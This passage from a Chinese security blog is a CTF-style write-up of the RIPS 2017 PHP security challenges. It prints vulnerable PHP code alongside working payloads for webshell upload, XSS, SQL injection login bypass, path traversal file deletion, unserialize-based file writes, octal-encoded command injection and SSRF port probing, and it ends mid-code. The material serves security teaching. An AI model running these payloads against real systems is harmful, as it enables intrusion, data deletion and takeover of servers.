三.代码逻辑这一类属于比较特别的，根据服务器端代码执行的逻辑通过条件竞争上传黑名单文件，条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生 。 以Pass-17为例，程序先进行文件上传后再判断文件是否合法，不合法再进行删除，如果利用多线程持续发送上传PHP文件的请求包，并不断访问上传的文件，服务器会来不及将不合法文件删除，我们也能因此而成功执行PHP文件代码 最后，再附上一张别人的总结图","categories":[{"name":"file upload","slug":"file-upload","permalink":"https://Foxgrin.github.io/categories/file-upload/"}],"tags":[{"name":"file upload","slug":"file-upload","permalink":"https://Foxgrin.github.io/tags/file-upload/"}]},{"title":"代码审计--PHP-Security","slug":"代码审计-PHP-Security","date":"2019-03-02T13:03:00.000Z","updated":"2019-03-11T07:10:34.442Z","comments":true,"path":"/posts/16636/","link":"","permalink":"https://Foxgrin.github.io/posts/16636/","excerpt":"RIPS 2017 PHP代码审计安全挑战","text":"RIPS 2017 PHP代码审计安全挑战 前言题目原地址： PHP Security Advent Calendar 2017 - https://www.ripstech.com/php-security-calendar-2017/ RIPSTECH PRESENTS PHP SECURITY CALENDAR 是由 RIPS 团队出品的PHP代码安全审计挑战系列题目，RIPSTECH PRESENTS PHP SECURITY CALENDAR 2017 共包含24道题目（Day 1 ~ 24），每道题目将包含一个较新颖的知识点供大家学习。 实验环境源码：https://github.com/vulnspy/ripstech-php-security-calendar-2017 参考题解：http://www.vulnspy.com/cn-ripstech-presents-php-security-calendar-2017/ Day011234567891011121314151617181920212223&lt;?phpclass Challenge &#123; const UPLOAD_DIRECTORY = './solutions/'; private $file; private $whitelist; public function __construct($file) &#123; $this-&gt;file = $file; $this-&gt;whitelist = range(1, 24); &#125; public function __destruct() &#123; if (in_array($this-&gt;file['name'], $this-&gt;whitelist)) &#123; move_uploaded_file( $this-&gt;file['tmp_name'], self::UPLOAD_DIRECTORY . $this-&gt;file['name'] ); &#125; &#125;&#125;$challenge = new Challenge($_FILES['solution']);show_source(__FILE__); 代码大致流程是构建了一个Challenge类，类中定义一个常量UPLOAD_DIRECTORY，用于定义上传文件存储的具体位置，并定义了两个魔术方法： 123__construct() - 在每次创建新对象时先调用此方法__destruct() - 对象的所有引用都被删除或者当对象被显式销毁时执行 __construct方法中对类中两个私有变量进行赋值，__destruct方法对上传的文件名进行了检查操作，检查文件名是否为整数，范围为1-24，问题就出在这个in_array方法，我们知道in_array方法的第三个参数默认是false，因此会进行弱类型比较，即将上传的文件名自动转化为整形与整数1-24进行比较。这就导致我们可以将恶意文件上传至服务器，只要文件名为数字1-24开头的文件，都可以上传至服务器。 新创建一个测试文件demo1.php，代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;demo1&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=&quot;post&quot; action=&quot;&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;solution&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;&lt;/form&gt;&lt;?php class Challenge &#123; const UPLOAD_DIRECTORY = &apos;E:/php/PHPTutorial/WWW/html/solutions/&apos;; private $file; private $whitelist; public function __construct($file) &#123; $this-&gt;file = $file; $this-&gt;whitelist = range(1, 24); &#125; public function __destruct() &#123; if (in_array($this-&gt;file[&apos;name&apos;], $this-&gt;whitelist)) &#123; echo $this-&gt;file[&apos;tmp_name&apos;]; move_uploaded_file( $this-&gt;file[&apos;tmp_name&apos;], self::UPLOAD_DIRECTORY . $this-&gt;file[&apos;name&apos;] ); &#125; else echo &quot;fail to upload.&quot;; &#125;&#125;$challenge = new Challenge($_FILES[&apos;solution&apos;]); ?&gt;&lt;/body&gt;&lt;/html&gt; 上传文件名1demo.php的一句话木马文件 成功上传 本关漏洞主要就在于in_array方法的第三个参数未设置，如果设置为true，则会检查搜索的数据与数组的值的类型是否相同，所以修正该漏洞的方法就是将第三个参数设置为true，如下： 1in_array($this-&gt;file['name'], $this-&gt;whitelist,true) 修改以后再尝试1demo.php文件，上传失败 Day021234567891011121314151617181920212223242526272829303132333435&lt;?php// composer require \"twig/twig\"require 'vendor/autoload.php';class Template &#123; private $twig; public function __construct() &#123; $indexTemplate = '&lt;img ' . 'src=\"https://loremflickr.com/320/240\"&gt;' . '&lt;a href=\"&#123;&#123;link|escape&#125;&#125;\"&gt;Next slide »&lt;/a&gt;'; // Default twig setup, simulate loading // index.html file from disk $loader = new Twig\\Loader\\ArrayLoader([ 'index.html' =&gt; $indexTemplate ]); $this-&gt;twig = new Twig\\Environment($loader); &#125; public function getNexSlideUrl() &#123; $nextSlide = $_GET['nextSlide']; return filter_var($nextSlide, FILTER_VALIDATE_URL); &#125; public function render() &#123; echo $this-&gt;twig-&gt;render( 'index.html', ['link' =&gt; $this-&gt;getNexSlideUrl()] ); &#125;&#125;(new Template())-&gt;render();show_source(__FILE__); 这关涉及了PHP的Twig模板语言，起到了渲染的作用。我们不需要过多的关注这个模板，我们需要关注的是我们可以控制的变量是$nextSlide，这个变量经过了一个函数filter_var的处理，这个函数的作用是根据指定过滤器的ID号对传入的参数进行过滤，这里过滤器ID号为FILTER_VALIDATE_URL，所以整个函数的作用是检查变量$nextSlide是否是一个合法的URL，我们可以写一个测试文件测试一下具体的检测流程： 123456789101112&lt;?php var_dump(filter_var(\"http://www.baidu.com\",FILTER_VALIDATE_URL)); #string(20) \"http://www.baidu.com\" var_dump(filter_var(\"www.baidu.com\",FILTER_VALIDATE_URL)); #bool(false) var_dump(filter_var(\"123://www.baidu.com\",FILTER_VALIDATE_URL)); #string(19) \"123://www.baidu.com\" var_dump(filter_var(\"123://123.com\",FILTER_VALIDATE_URL)); #string(13) \"123://123.com\" var_dump(filter_var(\"123://123\",FILTER_VALIDATE_URL)); #string(9) \"123://123\" var_dump(filter_var(\"123:/123\",FILTER_VALIDATE_URL)); #bool(false) var_dump(filter_var(\"123://\",FILTER_VALIDATE_URL)); #bool(false) var_dump(filter_var(\"1://1\",FILTER_VALIDATE_URL)); #string(5) \"1://1\" ?&gt; 经过测试发现具体只是检测变量中是否存在“://“ 过滤的URL再经过Twig的escape过滤后再渲染，查阅Twig的官方文档 1Internally, ``escape`` uses the PHP native `htmlspecialchars`_ function for the HTML escaping strategy. escape的过滤规则和htmlspecialchars函数过滤规则相同，会将单引号和双引号进行编码 经过这两个过滤后的URL会在页面中显示，见第9-11行： 123$indexTemplate = '&lt;img ' . 'src=\"https://loremflickr.com/320/240\"&gt;' . '&lt;a href=\"&#123;&#123;link|escape&#125;&#125;\"&gt;Next slide »&lt;/a&gt;'; 那么这关就存在XSS漏洞，我们知道在javascript中“//“是表示注释，“%250a”和”%0a”在浏览器中表示换行，那么我们就可以构造一下payload： 1?nextSlide=javascript://comment%250aalert(/xss/) 因为“//“表示注释，所以comment被注释，换行后执行alert(/xss/)，即执行： 12javascript://commentalert(/xss/) 执行效果如下图所示 成功进行XSS注入攻击 Day03123456789101112131415161718192021222324252627282930313233&lt;?phpfunction __autoload($className) &#123; include $className;&#125;$controllerName = $_GET['c'];$data = $_GET['d'];if (class_exists($controllerName)) &#123; $controller = new $controllerName($data['t'], $data['v']); $controller-&gt;render();&#125; else &#123; echo 'There is no page with this name';&#125;class HomeController &#123; private $template; private $variables; public function __construct($template, $variables) &#123; $this-&gt;template = $template; $this-&gt;variables = $variables; &#125; public function render() &#123; if ($this-&gt;variables['new']) &#123; echo 'controller rendering new response'; &#125; else &#123; echo 'controller rendering old response'; &#125; &#125;&#125;show_source(__FILE__); 这关涉及到了PHP的魔术方法__autoload，用于自动加载类，当一个类被实例化时，会自动调用该方法，方法中使用include进行调用实例化类的文件，常用于节约include方法的使用。 当然，还有许多函数方法被调用时也会自动调用__autoload方法，如第9行中的class_exists方法，它用来判断类名是否存在，除此之外还有以下方法也会自动调用__autoload方法： 1234567891011121314151617call_user_func()call_user_func_array()class_exists()class_implements()class_parents()class_uses()get_class_methods()get_class_vars()get_parent_class()interface_exists()is_a()is_callable()is_subclass_of()method_exists()property_exists()spl_autoload_call()trait_exists() 仔细观察class_exists()方法传入的参数是通过GET方式传入，可控，传入的参数即调用的文件名，这就造成了任意文件包含漏洞 输入?c=./demo2.php Day04123456789101112131415161718192021222324&lt;?phpclass Login &#123; public function __construct($user, $pass) &#123; $this-&gt;loginViaXml($user, $pass); &#125; public function loginViaXml($user, $pass) &#123; if ( $user != false &amp;&amp; $pass != false &amp;&amp; (!strpos($user, '&lt;') || !strpos($user, '&gt;')) &amp;&amp; (!strpos($pass, '&lt;') || !strpos($pass, '&gt;')) ) &#123; $format = '&lt;?xml version=\"1.0\"?&gt;' . '&lt;user v=\"%s\"/&gt;&lt;pass v=\"%s\"/&gt;'; $xml = sprintf($format, $user, $pass); $xmlElement = new SimpleXMLElement($xml); // Perform the actual login. $this-&gt;login($xmlElement); &#125; &#125;&#125;new Login($_POST['username'], $_POST['password']);show_source(__FILE__); 这题目的是为了进行XML注入，对于&lt;?xml version=&quot;1.0&quot;?&gt;&lt;user v=&quot;%s&quot;/&gt;&lt;pass v=&quot;%s&quot;/&gt;就必须要进行闭合标签的处理，而条件(!strpos($user, &#39;&lt;&#39;) || !strpos($user, &#39;&gt;&#39;)) &amp;&amp;(!strpos($pass, &#39;&lt;&#39;) || !strpos($pass, &#39;&gt;&#39;))本意是不允许我们对变量$user和变量$pass同时输入&lt;&gt;，但是我们知道strpos函数搜索不到目标时返回的是false，当找到目标在第一位时返回的是0，根据PHP弱类型比较，0和false是相等的 123var_dump(strpos(\"abcd\",\"a\")); # 0var_dump(strpos(\"abcd\",\"x\")); # falsevar_dump(0==false); # true 所以我们传入的$user和$pass第一位是&lt;或者&gt;即可绕过过滤，payload如下： 1username=&lt;&quot;&gt;&lt;injected-tag%20property=&quot;&amp;password=&lt;&quot;&gt;&lt;injected-tag%20property=&quot; 最终传入$this-&gt;login($xmlElement)的$xmlElement值是&lt;xml&gt;&lt;user=&quot;&lt;&quot;&gt;&lt;injected-tag property=&quot;&quot;/&gt;&lt;pass=&quot;&lt;&quot;&gt;&lt;injected-tag property=&quot;&quot;/&gt;&lt;/xml&gt; 就可以注入了 Day06123456789101112131415161718192021222324252627282930&lt;?phpclass TokenStorage &#123; public function performAction($action, $data) &#123; switch ($action) &#123; case 'create': $this-&gt;createToken($data); break; case 'delete': $this-&gt;clearToken($data); break; default: //throw new Exception('Unknown action'); echo 'Unknown action'; &#125; &#125; public function createToken($seed) &#123; $token = md5($seed); file_put_contents('/tmp/tokens/' . $token, '...data'); &#125; public function clearToken($token) &#123; $file = preg_replace(\"/[^a-z.-_]/\", \"\", $token); unlink('./tmp/tokens/' . $file); &#125;&#125;$storage = new TokenStorage();$storage-&gt;performAction($_GET['action'], $_GET['data']);show_source(__FILE__); 这题可以利用的函数有file_put_contents和unlink，但是file_put_contents函数的参数$token经过md5加密，不好利用，在观察unlink函数，参数$token经过preg_replace函数进行正则匹配过滤，过滤的规则是&quot;/[^a-z.-_]/&quot;，本意应该是除了a-z 和 . 和 - 和 _的字符都被替换为空，但是这里的-是没有被转义的，在[]中-是表示范围的意思，所以这里过滤的应该是除了ascii46-95 , 97-122的字符。也就是说.和/字符都不会被过滤，那么我们就可以利用路径穿越进行任意文件删除 payload如下： 1?action=delete&amp;data=../../demo2.php Day0712345678910111213141516171819202122232425262728&lt;?phpfunction getUser($id) &#123; global $config, $db; if($id == false)&#123; return; &#125; if (!is_resource($db)) &#123; $db = new MySQLi( $config['dbhost'], $config['dbuser'], $config['dbpass'], $config['dbname'] ); &#125; $sql = \"SELECT username FROM users WHERE id = ?\"; $stmt = $db-&gt;prepare($sql); $stmt-&gt;bind_param('i', $id); $stmt-&gt;bind_result($name); $stmt-&gt;execute(); $stmt-&gt;fetch(); return $name;&#125;$var = parse_url($_SERVER['HTTP_REFERER']);parse_str($var['query']);$currentUser = getUser($id);echo '&lt;h1&gt;'.htmlspecialchars($currentUser).'&lt;/h1&gt;';show_source(__FILE__); 这关考察的通过parse_url和parse_str函数导致的变量覆盖 123$var = parse_url(\"https://127.0.0.1/?a=1&amp;b=2\");print_r($var); #Array ( [scheme] =&gt; https [host] =&gt; 127.0.0.1 [path] =&gt; / [query] =&gt; a=1,b=2 )parse_str($var['query']); # $a == 1 , $b == 2 parse_url中的参数来自HTTP请求头部的Referer字段，是可控的，那么我们就可以控制getUser类中的$config和$db来在我们自己构造的数据库中进行查询 payload如下： 1http://127.0.0.1/html/day7.php?config[dbhost]=127.0.0.1&amp;config[dbuser]=root&amp;config[dbpass]=root&amp;config[dbname]=security&amp;id=1 Day081234567891011121314151617&lt;?phpif(!isset($_GET) || $_GET == false)&#123; show_source(__FILE__); exit;&#125;function complexStrtolower($regex, $value) &#123; return preg_replace( '/(' . $regex . ')/ei', 'strtolower(\"\\\\1\")', $value );&#125;foreach ($_GET as $regex =&gt; $value) &#123; echo complexStrtolower($regex, $value) . \"\\n\";&#125; 考察的是preg_replace/e函数导致的命令执行漏洞，我之前的文章（代码审计-通过preg_replace函数深入命令执行）有详细写到过这题 主要思路就是通过GET方式传入的变量名作为正则匹配条件，将匹配的值value传递到strtolower函数中进行命令执行，&quot;\\\\1&quot;即为第一个匹配到的字符串。 Payload如下： 1?\\S*=&#123;$&#123;phpinfo()&#125;&#125; \\S代表除空白符以外的所有字符，控制$value所有字符都会被匹配到，{${phpinfo()}}则涉及到PHP双引号下的变量会被解析和PHP可变变量 Day09123456789101112131415161718192021222324252627&lt;?phpclass LanguageManager&#123; public function loadLanguage() &#123; $lang = $this-&gt;getBrowserLanguage(); $sanitizedLang = $this-&gt;sanitizeLanguage($lang); if(file_exists(\"./lang/$sanitizedLang\"))&#123; require_once(\"./lang/$sanitizedLang\"); &#125; &#125; private function getBrowserLanguage() &#123; $lang = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] :'en'; return $lang; &#125; private function sanitizeLanguage($language) &#123; return str_replace('../', '', $language); &#125;&#125;$manage = new LanguageManager();$manage-&gt;loadLanguage();show_source(__FILE__); 考察的是任意文件包含漏洞，参数$_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;]可控，过滤函数str_replace只对../做一次过滤，双写即可绕过，Payload如下： 1Accept-Language: ..././..././demo.txt Day1012345678910111213141516171819202122&lt;?phpif(!isset($_POST) || $_POST == false)&#123; show_source(__FILE__); exit;&#125;extract($_POST);function goAway() &#123; error_log(\"Hacking attempt.\"); header('Location: /error/');&#125;if (!isset($pi) || !is_numeric($pi)) &#123; goAway();&#125;if (!assert(\"(int)$pi == 3\")) &#123; echo \"This is not pi.\";&#125; else &#123; echo \"This might be pi.\";&#125; 虽然看到了extract，但是这题考察的不是变量覆盖，我们可以看到goAway()函数中header重定向后并未使用die或者exit，这就导致了后面的代码依然会执行，所以我们直接POST变量pi=phpinfo，就会执行assert(&quot;(int)phpinfo() == 3&quot;)，在burp中能phpinfo的信息 Day1112345678910111213141516171819202122232425262728293031323334353637&lt;?phpclass Template &#123; public $cacheFile = '/tmp/cachefile'; public $template = '&lt;div&gt;Welcome back %s&lt;/div&gt;'; public function __construct($data = null) &#123; $data = $this-&gt;loadData($data); $this-&gt;render($data); &#125; public function loadData($data) &#123; if (substr($data, 0, 2) !== 'O:' &amp;&amp; !preg_match('/O:\\d:/', $data)) &#123; return unserialize($data); &#125; return []; &#125; public function createCache($file = null, $tpl = null) &#123; $file = $file ?? $this-&gt;cacheFile; $tpl = $tpl ?? $this-&gt;template; file_put_contents($file, $tpl); &#125; public function render($data) &#123; echo sprintf( $this-&gt;template, htmlspecialchars($data['name']) ); &#125; public function __destruct() &#123; $this-&gt;createCache(); &#125;&#125;new Template($_COOKIE['data']);show_source(__FILE__); 本题的正则表达式应修改为&#39;/O:\\d:/&#39; 看到unserialize就知道这题考察的是反序列化，对COOKIE中的变量data做了两个过滤处理 12substr($data, 0, 2) !== &apos;O:&apos;!preg_match(&apos;/O:\\d:/&apos;, $data) php可反序列化类型有String,Integer,Boolean,Null,Array,Object。去除掉Object后，考虑采用数组中存储对象进行绕过。 第二个正则匹配过滤，就需要利用到PHP反处理的源码，具体参考php反序列unserialize的一个小特性 ，在对象前加一个+号，即O:14-&gt;O:+14，这样就可以绕过正则匹配。 获取序列化字符串的代码如下： 1234567class Template &#123; public $cacheFile = './info.php'; public $template = '&lt;?php phpinfo();';&#125;$temp[] = new Template();$temp = serialize($temp);echo $temp; 获取payload如下： 1a:1:&#123;i:0;O:+8:&quot;Template&quot;:2:&#123;s:9:&quot;cacheFile&quot;;s:10:&quot;./info.php&quot;;s:8:&quot;template&quot;;s:16:&quot;&lt;?php phpinfo();&quot;;&#125;&#125; 这样，就可以利用file_put_contents函数将PHP代码写入一个PHP文件中 Day1212345678910111213141516&lt;?php$sanitized = [];foreach ($_GET as $key =&gt; $value) &#123; $sanitized[$key] = intval($value);&#125;$queryParts = array_map(function ($key, $value) &#123; return $key . '=' . $value;&#125;, array_keys($sanitized), array_values($sanitized));$query = implode('&amp;', $queryParts);echo \"&lt;a href='/images/size.php?\" . htmlentities($query) . \"'&gt;link&lt;/a&gt;\";show_source(__FILE__); 看到结尾的响应标签内容就猜到这题考察的可能是XSS，这里过滤的点有两个函数：（1）intval（2）htmlentities intval函数虽然过滤了$value，但是未过滤$key，我们通过$key进行XSS即可 htmlentities函数作用是将字符串转化为HTML实体，但是默认不对单引号进行转义，所以我们可以构造一下Payload： 1?&apos;onclick%3dalert(&apos;xss&apos;)//=1 利用的是a标签的onclick事件来进行XSS攻击 闭合后的标签为： 1&quot;&lt;a href=&apos;/images/size.php?&apos;onclick=alert(&apos;xss&apos;)//=1&apos;&gt;link&lt;/a&gt;&quot; Day1312345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phprequire_once \"bootstrap.php\";if($_POST == false)&#123; show_source(__FILE__); exit;&#125;class LoginManager &#123; private $em; private $user; private $password; public function __construct($user, $password) &#123; $this-&gt;em = DoctrineManager::getEntityManager(); $this-&gt;user = $user; $this-&gt;password = $password; &#125; public function isValid() &#123; $user = $this-&gt;sanitizeInput($this-&gt;user); $pass = $this-&gt;sanitizeInput($this-&gt;password); $queryBuilder = $this-&gt;em-&gt;createQueryBuilder() -&gt;select('COUNT(u)') -&gt;from(\"User\", \"u\") -&gt;where(\"u.user = '$user' AND u.password = '$pass'\"); $query = $queryBuilder-&gt;getQuery(); return boolval($query-&gt;getSingleScalarResult()); &#125; public function sanitizeInput($input, $length = 20) &#123; $input = addslashes($input); if (strlen($input) &gt; $length) &#123; $input = substr($input, 0, $length); &#125; return $input; &#125;&#125;$auth = new LoginManager($_POST['user'], $_POST['passwd']);if (!$auth-&gt;isValid()) &#123; exit;&#125;echo 'Hello, '.$_POST['user']; 看到关键字user和passwd和SQL语句就很明白，这题考察的是通过SQL注入进行任意用户登录 过滤的地方在于sanitizeInput函数： 1234567public function sanitizeInput($input, $length = 20) &#123; $input = addslashes($input); if (strlen($input) &gt; $length) &#123; $input = substr($input, 0, $length); &#125; return $input;&#125; 首先对我们输入的用户名和密码值通过addslashes函数进行了转义处理，然后经过substr函数截断前20位。因为有转义，我们如果输入反斜杠\\，经过转义后会变成\\\\，这样就不能过滤掉SQL语句中的单引号。但是，设想一下，如果我们输入的字符足够长，并且第二十位放置的是单引号&#39;或者反斜杠\\，那么经过转义和截断，最后一位就一定会是一个反斜杠\\，这就过滤了SQL语句中的单引号，造成SQL注入 Payload： 1?user=1234567890123456789&apos;&amp;passwd= or 1=1# 这样构成的SQL语句便是： 1SELECT COUNT(u) FROM User u WHERE u.user = &apos;1234567890123456789\\&apos; AND u.password = &apos; or 1=1#&apos; Day1412345678910111213141516171819202122232425&lt;?phpclass Carrot &#123; const EXTERNAL_DIRECTORY = '/tmp/'; private $id; private $lost = 0; private $bought = 0; public function __construct($input) &#123; $this-&gt;id = rand(1, 1000); foreach ($input as $field =&gt; $count) &#123; $this-&gt;$field = $count++; &#125; &#125; public function __destruct() &#123; file_put_contents( self::EXTERNAL_DIRECTORY . $this-&gt;id, var_export(get_object_vars($this), true) ); &#125;&#125;$carrot = new Carrot($_GET);show_source(__FILE__); 看到file_put_contents函数，猜测考察写入webshell，foreach函数存在变量覆盖： 123foreach ($input as $field =&gt; $count) &#123; $this-&gt;$field = $count++; &#125; $this-&gt;$field = $count++;中的++是后增，不会影响，所以我们可以通过此函数覆盖变量$id，控制写入的文件名和位置：id=../../var/www/html/info.php 再观察写入的内容，经过两个函数get_object_vars和var_export的处理，先看看这两个函数的作用： 12get_object_vars — 返回由对象属性组成的关联数组var_export — 输出或返回一个变量的字符串表示 var_export与var_dump区别在于var_export输出的是合法的PHP代码，那么我们就可以写入合法的PHP代码 最终的Payload如下： 1?id=../../var/www/html/info.php&amp;a=&lt;?php phpinfo(); ?&gt; 最终写入的内容是： 123456array (&apos;id&apos; =&gt; &apos;../../var/www/html/test/shell.php&apos;,&apos;lost&apos; =&gt; 0,&apos;bought&apos; =&gt; 0,&apos;a&apos; =&gt; &apos;&lt;?php phpinfo()?&gt;&apos;) Day1512345678910111213141516171819202122232425262728&lt;?phpclass Redirect &#123; private $websiteHost = 'www.vulnspy.com'; private function setHeaders($url) &#123; $url = urldecode($url); header(\"Location: $url\"); &#125; public function startRedirect($params) &#123; $parts = explode('/', $_SERVER['PHP_SELF']); print_r($parts); $baseFile = end($parts); echo '$baseFile = '.$baseFile.\"&lt;br&gt;\"; $url = sprintf( \"%s?%s\", $baseFile, http_build_query($params) ); echo '$url = '.$url.\"&lt;br&gt;\"; $this-&gt;setHeaders($url); &#125;&#125;if ($_GET['redirect']) &#123; (new Redirect())-&gt;startRedirect($_GET['params']);&#125;show_source(__FILE__); 这题考察的是任意路径跳转，跳转的路径来源于$_SERVER[&#39;PHP_SELF&#39;]，这个全局变量含义是当前执行脚本在服务器下的路径，再通过explode函数将路径以/为分隔符分隔成一个数组，通过end函数将数组最后一个元素取出拼接上参数$params，再经过urldecode函数进行一次URL解码后作为重定向的url 假想我们要跳转到百度页面，访问http://127.0.0.1/html/day15.php/https://www.baidu.com?redirect=1，那么经过处理后的跳转的应该是Location: www.baidu.com，还是站内页面。我们要跳转到站外，就必须要加上http，所以，我们就可以利用题目中的一次URL解码加上本身浏览器对GET就有一次URL解码，对//进行二次URL编码，编码后为%25%32%66%25%32%66，那么payload就为： 1http://127.0.0.1/html/day15.php/https:%25%32%66%25%32%66www.baidu.com?redirect=1 最后跳转的为： 1Location: https://www.baidu.com? 就成功跳转到百度页面 Day1612345678910111213141516171819202122232425262728293031323334353637&lt;?phpclass FTP &#123; public $sock; public function __construct($host, $port, $user, $pass) &#123; $this-&gt;sock = fsockopen($host, $port); $this-&gt;login($user, $pass); $this-&gt;cleanInput(); $this-&gt;mode($_REQUEST['mode']); $this-&gt;send($_FILES['file']); &#125; private function cleanInput() &#123; $_GET = array_map('intval', $_GET); $_POST = array_map('intval', $_POST); $_COOKIE = array_map('intval', $_COOKIE); &#125; public function login($username, $password) &#123; fwrite($this-&gt;sock, \"USER \" . $username . \"\\n\"); fwrite($this-&gt;sock, \"PASS \" . $password . \"\\n\"); &#125; public function mode($mode) &#123; if ($mode == 1 || $mode == 2 || $mode == 3) &#123; fputs($this-&gt;sock, \"MODE $mode\\n\"); &#125; &#125; public function send($data) &#123; fputs($this-&gt;sock, $data); &#125;&#125;new FTP('localhost', 21, 'user', 'password');show_source(__FILE__); 这题的漏洞在于$this-&gt;mode($_REQUEST[&#39;mode&#39;]);和== 首先，我们知道全局变量$_REQUEST[]是取值于$_GET，$_POST和$_COOKIE，即当三个全局变量一旦有赋值，$_REQUEST就被赋值，后面值不会再因为它们三个全局变量改变而改变，举个例子： 123$_GET = array_map(&apos;intval&apos;,$_GET);var_dump($_GET);var_dump($_REQUEST); 最后输出的是： 12array(1) &#123; [&quot;a&quot;]=&gt; int(1) &#125; array(1) &#123; [&quot;a&quot;]=&gt; string(4) &quot;1abc&quot; &#125; 第二，==在PHP中是弱类型比较，即1 == &#39;1a&#39;，所以最后的payload为： 1?mode=1%0a%0dDELETE%20test.file 就可以利用ftp协议来删除文件了 Day17123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phprequire_once \"bootstrap.php\";if($_POST == false)&#123; show_source(__FILE__); exit;&#125;class RealSecureLoginManager &#123; private $em; private $user; private $password; public function __construct($user, $password) &#123; $this-&gt;em = DoctrineManager::getEntityManager(); $this-&gt;user = $user; $this-&gt;password = $password; &#125; public function isValid() &#123; $pass = md5($this-&gt;password, true); $user = $this-&gt;sanitizeInput($this-&gt;user); $queryBuilder = $this-&gt;em-&gt;createQueryBuilder() -&gt;select(\"COUNT(u)\") -&gt;from(\"User\", \"u\") -&gt;where(\"u.password = '$pass' AND u.user = '$user'\"); $query = $queryBuilder-&gt;getQuery(); return boolval($query-&gt;getSingleScalarResult()); &#125; public function sanitizeInput($input) &#123; return addslashes($input); &#125;&#125;$auth = new RealSecureLoginManager( $_POST['user'], $_POST['passwd']);if (!$auth-&gt;isValid()) &#123; exit;&#125;echo 'Hello, '.$_POST['user']; 这题看起来是Day13的升级版，那题我们是利用addslashes和字符串截断进行\\逃逸，从而进行SQL注入。这题对$pass进行了md5加密，但这里我们注意到md5函数中加入了参数true，我们可以测试一下： 12var_dump(md5(1));var_dump(md5(1,true)); 输出的是： 12string(32) &quot;c4ca4238a0b923820dcc509a6f75849b&quot; string(16) &quot;��B8��#� �P�ou��&quot; 看出加入true参数后与原来输出是有区别的，那么我们可以进行fuzz测试，看看有没有md5处理后最后一个字符为\\ 测试代码如下： 1234567for($i=1;$i++;)&#123; $key = md5($i,true); if(substr($key,strlen($key)-1,1) == '\\\\')&#123; echo '$i = '.$i.' $key = '.$key; break; &#125;&#125; 结果为： 1$i = 128 $key = v�a\u001dn���l���q��\\ 所以我们就可以构造payload： 1pass=128&amp;user=&apos; or 1=1# 从而进行SQL注入 Day181234567891011121314&lt;?phpclass JWT &#123; public function verifyToken($data, $signature) &#123; $pub = openssl_pkey_get_public(\"file://pub_key.pem\"); $signature = base64_decode($signature); if (openssl_verify($data, $signature, $pub)) &#123; $object = json_decode(base64_decode($data)); $this-&gt;loginAsUser($object); &#125; &#125;&#125;(new JWT())-&gt;verifyToken($_GET['d'], $_GET['s']);show_source(__FILE__); 这题没怎么看懂，大致是利用openssl_verify遇到错误时会返回-1，而if语句只有判断为0和false才不会执行。 Day191234567891011121314151617181920212223242526272829&lt;?phpclass ImageViewer &#123; private $file; function __construct($file) &#123; $this-&gt;file = \"images/$file\"; $this-&gt;createThumbnail(); &#125; function createThumbnail() &#123; $e = stripcslashes( preg_replace( '/[^0-9\\\\\\]/', '', isset($_GET['size']) ? $_GET['size'] : '25' ) ); system(\"/usr/bin/convert &#123;$this-&gt;file&#125; --resize $e ./thumbs/&#123;$this-&gt;file&#125;\"); &#125; function __toString() &#123; return \"&lt;a href=&#123;$this-&gt;file&#125;&gt; &lt;img src=./thumbs/&#123;$this-&gt;file&#125;&gt;&lt;/a&gt;\"; &#125;&#125;echo (new ImageViewer(\"image.png\"));show_source(__FILE__); 这题关键在于stripcslashes函数，它能返回反转义后的字符串。可识别类似 C 语言的 \\n，\\r，… 八进制以及十六进制的描述。 而下面的正则匹配过滤过滤掉除了0-9和反斜杠\\，所以我们可以将我们要执行的命令转化为八进制，这样就可以构成任意命令执行的漏洞 例如执行sleep命令，将0;sleep 5;转化为八进制为0\\073\\163\\154\\145\\145\\160\\0405\\073 payload： 1?size=0\\073\\163\\154\\145\\145\\160\\0405\\073 Day20123456789101112131415161718192021222324252627282930313233343536&lt;?phpif(!isset($_GET) || $_GET == false)&#123; show_source(__FILE__); exit;&#125;set_error_handler(function ($no, $str, $file, $line) &#123; throw new ErrorException($str, 0, $no, $file, $line);&#125;, E_ALL);class ImageLoader&#123; public function getResult($uri) &#123; if (!filter_var($uri, FILTER_VALIDATE_URL)) &#123; return '&lt;p&gt;Please enter valid uri&lt;/p&gt;'; &#125; try &#123; $image = file_get_contents($uri); $path = \"./images/\" . uniqid() . '.jpg'; file_put_contents($path, $image); if (mime_content_type($path) !== 'image/jpeg') &#123; unlink($path); return '&lt;p&gt;Only .jpg files allowed&lt;/p&gt;'; &#125; &#125; catch (Exception $e) &#123; return '&lt;p&gt;There was an error: ' . $e-&gt;getMessage() . '&lt;/p&gt;'; &#125; return '&lt;img src=\"' . $path . '\" width=\"100\"/&gt;'; &#125;&#125;echo (new ImageLoader())-&gt;getResult($_GET['img']); 这关考察的是利用file_get_contents函数通过set_error_handler产生报错信息来产生SSRF，我们可以通过SSRF来检测内部服务是否开启，例如输入payload为： 1?img=http://127.0.0.1:22 如果响应结果为：There was an error: file_get_contents(http://127.0.0.1:22): failed to open stream: HTTP request failed! SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2则说明存在SSH服务 如果检测一个不存在端口?img=http://127.0.0.1:30，则响应There was an error: file_get_contents(http://127.0.0.1:30): failed to open stream: Connection refused，说明服务不存在 Day211234567891011121314151617181920212223242526272829303132333435&lt;?phpdeclare(strict_types=1);class ParamExtractor &#123; private $validIndices = []; private function indices($input) &#123; $validate = function (int $value, $key) &#123; if ($value &gt; 0) &#123; $this-&gt;validIndices[] = $key; &#125; &#125;; try &#123; array_walk($input, $validate, 0); &#125; catch (TypeError $error) &#123; echo \"Only numbers are allowed as input\"; &#125; return $this-&gt;validIndices; &#125; public function getCommand($parameters) &#123; $indices = $this-&gt;indices($parameters); $params = []; foreach ($indices as $index) &#123; $params[] = $parameters[$index]; &#125; return implode($params, ' '); &#125;&#125;$cmd = (new 